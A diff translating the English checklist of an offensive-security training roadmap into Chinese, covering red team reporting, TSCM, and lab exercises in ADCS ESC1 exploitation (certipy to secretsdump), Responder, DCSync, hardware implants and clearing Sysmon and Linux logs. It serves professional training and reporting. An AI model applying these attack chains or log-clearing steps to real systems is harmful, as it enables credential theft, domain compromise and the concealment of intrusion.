+  [ ] 基于范围界定问卷起草一份完整的 ROE 文件
+  [ ] 为一项真实或模拟的发现撰写一份完整的发现报告（完整格式），
+      使用 CVSSv4.0 并给出正确的向量串
+  [ ] 用 cvssv4calc.first.org 计算一个 CVSSv4.0 分值，并解释你所选发现的
+      每一项度量取值
+  [ ] 向一位非技术同事做一次 10 分钟的模拟复盘，
+      覆盖复盘的全部五个部分
+  [ ] 撰写一份 2 页的修复路线图，采用 30/90/6 个月的结构
+  [ ] 解释 TIBER-EU 行动的三方报告结构
+  [ ] 解释 TIBER-EU 行动与标准红队的区别：
+      威胁情报阶段、监管报送、范围约束
+```
+
+### 清理与 TSCM
+
+```
+  [ ] 在实验室运行 Windows 清理脚本：验证清理后没有残留的计划任务、
+      注册表键或服务
+  [ ] 运行 Sysmon 专项清理，并验证 Sysmon 日志已被清除
+  [ ] 在实验室运行 Linux 清理脚本：验证 bash 历史、cron 任务、
+      systemd 单元与 auth.log 都已处理
+  [ ] 针对盲测红队场景走一遍日志清除决策树：
+      记录你清除了什么以及为什么
+  [ ] 用 RF Explorer 对一间放有 Pi Zero W（运行 WiFi）的房间做射频扫描：
+      在频谱中识别出该设备
+  [ ] 在房间中使用 NLJD（或 NLJD 模拟器）：记录并甄别 3 个以上
+      误报，直到只剩一个候选设备
+  [ ] 完成 TSCM 实验练习：搭建 Pi Zero 音频植入体、藏匿它，
+      用全部 5 种检测方法尝试检测，记录结果
+  [ ] 解释全部四条攻击性植入原则，并把每一条与其
+      对应的检测缺口联系起来
 ```
 
 ### ADCS
 
 ```
-  [ ] Run certipy find against a lab AD environment: identify any misconfigured templates
-  [ ] Execute ESC1 exploitation end-to-end in a lab:
+  [ ] 对实验 AD 环境运行 certipy find：识别出任何配置错误的模板
+  [ ] 在实验中端到端执行 ESC1 利用：
       certipy find -> certipy req -> certipy auth -> impacket-secretsdump
-  [ ] Restore a certificate template after ESC4 exploitation using the saved config
-  [ ] Revoke a certificate issued during the lab exercise from the CA console
-  [ ] Add ADCS findings to a sample report with correct MITRE ATT&CK mapping (T1649)
-  [ ] Explain ADCS ESC1 to a Windows systems administrator in plain English:
-      what the template misconfiguration is, why it is dangerous, how to fix it
-  [ ] Explain why ADCS certificates bypass password resets and why that matters
+  [ ] 在 ESC4 利用后使用保存的配置还原证书模板
+  [ ] 从 CA 控制台吊销实验练习期间签发的证书
+  [ ] 把 ADCS 发现写入示例报告，并给出正确的 MITRE ATT&CK 映射（T1649）
+  [ ] 用平实的语言向 Windows 系统管理员解释 ADCS ESC1：
+      模板配置错误是什么、为何危险、如何修复
+  [ ] 解释为何 ADCS 证书能绕过密码重置，以及这为何重要
 ```
 
-### Full Operational Scenario
+### 完整作战场景
 
 ```
-  [ ] Complete Operation Silent Ledger v2 in a lab environment with:
-      - A physical component (deploy and retrieve a LAN Turtle)
-      - Responder credential capture
-      - BloodHound AD attack path enumeration
-      - ADCS ESC1 exploitation
-      - DCSync / NTDS.dit dump
-      - At least one cloud lateral movement step (simulate if no Azure lab)
-      - Ransomware simulation with test files + immediate restore
-      - Full digital cleanup (Windows + Linux + AD)
-      - Physical retrieval of the LAN Turtle
+  [ ] 在实验环境中完成寂静账本行动 v2，包含：
+      - 物理环节（部署并取回一台 LAN Turtle）
+      - Responder 凭证捕获
+      - BloodHound AD 攻击路径枚举
+      - ADCS ESC1 利用
+      - DCSync / NTDS.dit 转储
+      - 至少一个云上横向移动步骤（若无 Azure 实验环境可模拟）
+      - 用测试文件做勒索软件模拟 + 立即还原
+      - 完整数字清理（Windows + Linux + AD）
+      - 物理取回 LAN Turtle
   
-  [ ] Write a complete report for the lab engagement covering:
-      - Executive summary (1 page)
-      - 5 findings with CVSSv4.0 scores and MITRE ATT&CK mapping
-      - Attack narrative (chronological, day by day)
-      - Remediation roadmap (30/90/6-month)
+  [ ] 为这次实验行动撰写一份完整报告，涵盖：
+      - 执行摘要（1 页）
+      - 5 项发现，带 CVSSv4.0 分值与 MITRE ATT&CK 映射
+      - 攻击叙述（按时间顺序，逐日）
+      - 修复路线图（30/90/6 个月）
   
-  [ ] Deliver a 20-minute debrief on your lab engagement to a colleague
-      who plays the role of the CISO: field their questions in character
+  [ ] 向一位扮演 CISO 的同事做一次 20 分钟的实验室行动复盘：
+      以其角色身份回答他们的问题
 ```
 
 ---
 
-## PHASE 6 COMPLETION
+## 第 6 阶段完成
 
 ```
-When you can check every item in the Phase 6 competency checklist:
+当你能勾选第 6 阶段能力清单中的每一项时：
 
-  Physical Red Team:    [ ] All items
-  Social Engineering:   [ ] All items
-  Quantum Computing:    [ ] All items
-  Red Team Operations:  [ ] All items
-  Cleanup and TSCM:     [ ] All items
-  ADCS:                 [ ] All items
-  Operational Scenario: [ ] All items
+  物理红队：     [ ] 全部项
+  社会工程：     [ ] 全部项
+  量子计算：     [ ] 全部项
+  红队行动：     [ ] 全部项
+  清理与 TSCM：  [ ] 全部项
+  ADCS：         [ ] 全部项
+  作战场景：     [ ] 全部项
 
-You have completed Phase 6.
+你已完成第 6 阶段。
 
-What you have built:
-  A complete physical red team capability: from lockpicking to RFID cloning to
-  EDR-evasive hardware implants with cloud-native callbacks.
+你已构建的能力：
+  一套完整的物理红队能力：从开锁到 RFID 克隆，再到
+  具备云原生回连能力的规避 EDR 硬件植入体。
   
-  A social engineering methodology that covers the full human attack surface:
-  vishing with objection handling, spear-phishing infrastructure, USB drops,
-  and in-person pretext entry with identity legend development.
+  一套覆盖完整人的攻击面的社会工程方法论：
+  带异议处理的语音钓鱼、鱼叉邮件基础设施、USB 投放，
+  以及含身份故事构建的面对面托词进入。
   
-  A forward-looking understanding of quantum cryptography threats and the
-  SNDL attack model that is active RIGHT NOW, not in 10 years.
+  对量子密码学威胁的前瞻性理解，以及
+  此刻就在运行的 SNDL 攻击模型——不是十年后。
   
-  Professional red team operations standards: scoping, ROE, CVSSv4.0 reporting,
-  structured debrief, purple team, re-test, and TIBER-EU/CBEST frameworks.
+  专业的红队行动标准：范围界定、ROE、CVSSv4.0 报告、
+  结构化复盘、紫队、复测，以及 TIBER-EU/CBEST 框架。
   
-  Complete post-engagement cleanup including Sysmon artifacts: the gap that
-  most red teams leave behind.
+  完整的行动后清理，包括 Sysmon 痕迹：多数红队
+  会留下的那个缺口。
   
-  TSCM capability: you understand how surveillance devices are found, which
-  means you understand how to plant ones that are not.
+  TSCM 能力：你理解监控设备是如何被发现的，
+  这意味着你理解如何植入不被发现的设备。
   
-  ADCS exploitation: the dominant 2027 escalation vector, end-to-end,
-  including cleanup and detection evasion.
+  ADCS 利用：2027 年的主导提权路径，端到端，
+  包括清理与检测规避。
   
-  A full chained operation: physical to on-premises AD to cloud lateral
-  movement and crown jewel access, with complete cleanup and professional reporting.
+  一次完整的串联行动：从物理到本地 AD，再到云上横向
+  移动与核心资产访问，并配以完整清理和专业报告。
 
-The top 0.0001% is not a title. It is a standard.
-This is what the standard looks like.
+前 0.0001% 不是一个头衔。它是一条标准。
+这就是那条标准的样子。
 ```
 
 ---
 
 <div align="right">
 
-*Build the capability. Document the method. Tend the light.*<br/>
-*The BlackHAT Roadmap | Maintained by Sagar Biswas ([@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT))*<br/>
-*Licensed under Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)*
+*构建能力。记录方法。守护那束光。*<br/>
+*The BlackHAT Roadmap | 由 Sagar Biswas 维护（[@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT)）*<br/>
+*依据 Creative Commons Attribution-ShareAlike 4.0 International（CC BY-SA 4.0）许可发布*
 
 </div>
 
